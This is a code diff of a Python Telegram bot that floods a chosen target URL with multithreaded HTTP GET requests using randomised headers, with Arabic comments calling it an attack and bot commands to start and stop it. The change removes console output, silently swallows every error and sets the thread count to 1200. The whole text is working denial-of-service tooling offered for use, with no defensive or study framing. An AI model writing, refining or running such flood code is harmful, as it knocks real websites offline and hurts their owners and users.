@@ -2,7 +2,6 @@ import requests
 import threading
 import random
 import telebot
-from colorama import Fore, Style
 
 # متغير لتتبع حالة إيقاف الهجوم
 stop_attack_flag = False
@@ -37,11 +36,10 @@ def send_requests(target):
         try:
             headers = get_random_headers()
             requests.get(target, headers=headers, timeout=5)
-            print(Fore.GREEN + f"Request sent to {target}" + Style.RESET_ALL)
-        except requests.exceptions.RequestException as e:
-            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
+        except requests.exceptions.RequestException:
+            pass  # تجاهل جميع الأخطاء دون طباعة أي رسائل
 
-def start_attack(target, num_threads=1300):
+def start_attack(target, num_threads=1200):
     """بدء الهجوم باستخدام عدد من الخيوط."""
     global stop_attack_flag
     stop_attack_flag = False
@@ -80,5 +78,4 @@ def handle_stop(message):
     bot.reply_to(message, "تم إيقاف الهجوم.")
 
 if __name__ == "__main__":
-    print("Bot is running...")
     bot.polling()
